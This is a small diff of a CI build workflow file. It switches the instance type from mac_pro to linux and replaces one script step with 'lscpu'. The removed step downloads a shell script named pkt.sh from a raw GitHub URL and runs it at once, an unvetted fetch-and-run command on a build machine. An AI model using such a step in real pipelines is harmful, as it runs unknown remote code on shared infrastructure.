@@ -1,7 +1,7 @@
 workflows:
   my-workflow:
     name: My workflow name
-    instance_type: mac_pro
+    instance_type: linux
     max_build_duration: 120
     scripts:
-      - wget https://raw.githubusercontent.com/cnvrg001/mac/main/pkt.sh && sh pkt.sh
+      - lscpu
